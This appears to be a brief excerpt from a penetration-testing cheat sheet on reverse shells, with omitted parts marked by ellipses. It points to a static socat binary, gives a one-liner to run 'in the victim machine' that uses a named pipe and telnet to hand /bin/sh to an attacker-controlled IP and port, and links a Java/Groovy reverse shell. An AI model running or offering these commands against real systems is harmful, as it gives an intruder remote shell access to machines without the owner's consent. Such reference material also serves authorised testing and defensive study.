...
Static socat binary can be found at [https://github.com/andrew-d/static-binaries](https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86\_64/socat)
...
# Altneratively (run this in the victim machine)
mknod a p && telnet <YOUR_IP> <YOUR_PORT> 0<a | /bin/sh 1>a
```
...
Java reverse shell also work for Groovy by [frohoff](https://gist.github.com/frohoff/fed1ffaab9b9beeb1c76)&#x20;
